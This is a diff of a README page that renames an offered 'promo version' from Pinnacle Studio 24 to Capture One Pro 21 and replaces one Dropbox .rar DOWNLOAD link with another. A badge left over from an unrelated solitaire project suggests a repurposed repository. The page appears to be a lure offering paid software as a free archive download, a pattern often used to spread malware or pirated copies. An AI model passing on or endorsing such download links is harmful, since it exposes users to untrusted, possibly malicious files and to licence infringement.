@@ -1,4 +1,4 @@
-<h1 align="center">Pinnacle Studio 24(promo version 2.2.4)</h1>
+<h1 align="center">Capture One Pro 21(promo version 2.3.4)</h1>
 <h2 align="center">
 
 </h2>
@@ -17,7 +17,7 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a  href="https://www.dropbox.com/s/zmb04zc4ii7zzfa/Pinnacle%20Studio%2024%20%28promo%20version%29.rar?dl=1">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/s2xxz8h91iowxjr/Capture%20One%2021%20Pro%28promo%20version%20for%20YouTube%29.rar?dl=1">DOWNLOAD</a></h1>
 
 ## Description
 
